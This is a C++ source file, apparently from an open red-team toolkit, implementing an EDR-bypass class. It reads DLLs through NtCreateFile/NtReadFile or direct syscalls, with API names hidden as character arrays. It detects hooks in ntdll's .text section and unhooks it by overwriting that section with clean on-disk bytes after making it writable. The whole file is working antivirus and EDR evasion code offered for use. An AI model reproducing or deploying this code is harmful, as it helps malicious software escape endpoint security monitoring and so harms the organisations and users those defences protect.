/*
* Author: Hegusung
* Github: https://github.com/hegusung/RedCpp
*/

#include "bypass_av.h"

Bypass_EDR::Bypass_EDR()
{

}

Bypass_EDR::~Bypass_EDR()
{

}

/*
* Functions to access DLL files
*/

HANDLE Bypass_EDR::CreateFileW(LPWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes)
{
	HANDLE h;
	OBJECT_ATTRIBUTES obj = { 0 };
	IO_STATUS_BLOCK isb = { 0 };

	DUNICODE_STRING unicodeString;

	LPWSTR lpFullFileName = (LPWSTR)malloc((10 + wcslen(lpFileName)) * sizeof(wchar_t));
	if (lpFileName[0] != L'\\')
	{
		swprintf_s(lpFullFileName, 10 + wcslen(lpFileName), L"\\??\\\\%s", lpFileName);
	}
	else
	{
		swprintf_s(lpFullFileName, 10 + wcslen(lpFileName), L"%s", lpFileName);
	}

	RtlInitUnicodeString(&unicodeString, lpFullFileName);
	InitializeObjectAttributes(&obj, &unicodeString, OBJ_CASE_INSENSITIVE, NULL, NULL);

#if defined(METHOD_NTDLL)
	char ntdll_dll_str[] = { 'n','t','d','l','l','.','d','l','l', 0 };
	HMODULE hNtDll = LoadLibraryA(ntdll_dll_str);
	char ntcreatefile_str[] = { 'N','t','C','r','e','a','t','e','F','i','l','e', 0};
	_NtCreateFile fNtCreateFile = (_NtCreateFile)GetProcAddress(hNtDll, ntcreatefile_str);

	NTSTATUS status = fNtCreateFile(&h, dwDesiredAccess, &obj, &isb, 0,
		dwFlagsAndAttributes, dwShareMode, dwCreationDisposition,
		FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
#elif defined(METHOD_SYSCALL_EMBEDDED)  || defined(METHOD_SYSCALL_JUMPER) || defined(METHOD_SYSCALL_JUMPER_RANDOMIZED) || defined(METHOD_SYSCALL_EGG_HUNTER)
	NTSTATUS status = NtCreateFile(&h, dwDesiredAccess, &obj, &isb, 0,
		dwFlagsAndAttributes, dwShareMode, dwCreationDisposition,
		FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
#endif

	free(lpFullFileName);

	if (status != 0)
	{
		printf("Error: %x\n", status);
		return NULL;
	}

	return h;
}

NTSTATUS Bypass_EDR::ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead)
{
	IO_STATUS_BLOCK io;
	memset(&io, 0, sizeof(IO_STATUS_BLOCK));

#if defined(METHOD_NTDLL)
	char ntdll_dll_str[] = { 'n','t','d','l','l','.','d','l','l', 0 };
	HMODULE hNtDll = LoadLibraryA(ntdll_dll_str);
	char ntreadfile_str[] = { 'N','t','R','e','a','d','F','i','l','e', 0 };
	_NtReadFile fNtReadFile = (_NtReadFile)GetProcAddress(hNtDll, ntreadfile_str);

	NTSTATUS status = fNtReadFile(hFile, NULL, NULL, NULL, &io, lpBuffer, nNumberOfBytesToRead, NULL, NULL);
#elif defined(METHOD_SYSCALL_EMBEDDED)  || defined(METHOD_SYSCALL_JUMPER) || defined(METHOD_SYSCALL_JUMPER_RANDOMIZED) || defined(METHOD_SYSCALL_EGG_HUNTER)
	NTSTATUS status = NtReadFile(hFile, NULL, NULL, NULL, &io, lpBuffer, nNumberOfBytesToRead, NULL, NULL);
#endif

	*lpNumberOfBytesRead = io.Information;

	return status;
}

BOOL Bypass_EDR::CloseHandle(HANDLE hObject)
{
#if defined(METHOD_NTDLL)
	char ntdll_dll_str[] = { 'n','t','d','l','l','.','d','l','l', 0 };
	HMODULE hNtDll = LoadLibraryA(ntdll_dll_str);
	char ntclose_str[] = { 'N','t','C','l','o','s','e', 0 };
	_NtClose fNtClose = (_NtClose)GetProcAddress(hNtDll, ntclose_str);

	NTSTATUS status = fNtClose(hObject);
#elif defined(METHOD_SYSCALL_EMBEDDED)  || defined(METHOD_SYSCALL_JUMPER) || defined(METHOD_SYSCALL_JUMPER_RANDOMIZED) || defined(METHOD_SYSCALL_EGG_HUNTER)
	NTSTATUS status = NtClose(hObject);
#endif

	if (status == 0)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}


#include <iostream>
void print_buffer(char* address, unsigned int size)
{
	for (int i = 0; i < size; ++i)
		std::cout << std::hex << std::setfill('0') << std::setw(2) << (int)address[i] << " ";
	std::cout << std::endl;
}

int Bypass_EDR::check_dll(const char* dll_name, const char* ntdll_data)
{
	int compare = -1;
	HANDLE process = (HANDLE)-1;

	MODULEINFO mi = {};
	HMODULE ntdllModule = GetModuleHandleA(dll_name);

	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {

			int res = memcmp((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdll_data + (DWORD_PTR)hookedSectionHeader->PointerToRawData), hookedSectionHeader->Misc.VirtualSize);
			if (res == 0)
			{
				compare = 0;
			}
			else
			{
				compare = 1;
			}
		}
	}

	CloseHandle(process);
	FreeLibrary(ntdllModule);

	return compare;
}

BOOL Bypass_EDR::unhook_dll(const char* dll_name, const char* ntdll_data)
{
	//HANDLE process = GetCurrentProcess();
	HANDLE process = (HANDLE)-1;

	MODULEINFO mi = {};
	HMODULE ntdllModule = GetModuleHandleA(dll_name);

	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			DWORD oldProtection = 0;
			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdll_data + (DWORD_PTR)hookedSectionHeader->PointerToRawData), hookedSectionHeader->Misc.VirtualSize);
			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}

	CloseHandle(process);
	FreeLibrary(ntdllModule);

	return TRUE;
}